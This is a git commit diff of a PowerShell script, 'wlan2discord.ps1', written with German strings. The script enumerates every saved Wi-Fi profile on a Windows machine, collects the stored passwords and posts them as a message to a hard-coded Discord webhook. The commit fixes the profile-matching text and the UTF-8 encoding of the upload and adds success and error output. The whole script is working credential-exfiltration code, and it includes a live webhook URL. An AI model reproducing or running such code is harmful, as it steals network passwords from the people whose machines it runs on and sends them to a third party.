2f5de5a238a876b47a18023218f2eb813f1c1987
Tamas162 <duachne@gmail.com>
2025-05-28 00:17:31 +0200

    wlan2discord.ps1

--- wlan2discord.ps1
+++ wlan2discord.ps1
@@ -1,7 +1,7 @@
-# Alle WLAN-Profile abfragen
-$profiles = netsh wlan show profiles | Select-String "Alle Benutzerprofile" | ForEach-Object {
+$profiles = netsh wlan show profiles | Select-String "Profil für alle Benutzer" | ForEach-Object {
     ($_ -split ":")[1].Trim()
 }
+Write-Host "Gefundene Profile: $($profiles -join ', ')"
 
 $results = @()
 foreach ($profile in $profiles) {
@@ -14,12 +14,17 @@ foreach ($profile in $profiles) {
     }
     $results += "$profile : $password"
 }
-
 $text = ($results -join "`n")
-# Nachricht für Discord vorbereiten
+Write-Host "Text an Discord:`n$text"
+
 $payload = @{
     "content" = "WLAN-Passwörter:`n$text"
-} | ConvertTo-Json -Encoding UTF8
+} | ConvertTo-Json
+$body = [System.Text.Encoding]::UTF8.GetBytes($payload)
 
-# An Discord senden (Webhook-URL eintragen!)
-Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1377037403595739276/1bMWNUwWHnFiT-si9lhffTVM18sugLzq2Hz7NfEhmlmenMr36rgpu-y8wDLljLz08Zp3" -Method Post -ContentType "application/json" -Body $payload
+try {
+    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1377037403595739276/1bMWNUwWHnFiT-si9lhffTVM18sugLzq2Hz7NfEhmlmenMr36rgpu-y8wDLljLz08Zp3" -Method Post -ContentType "application/json" -Body $body
+    Write-Host "Senden erfolgreich"
+} catch {
+    Write-Host "Fehler beim Senden: $_"
+}
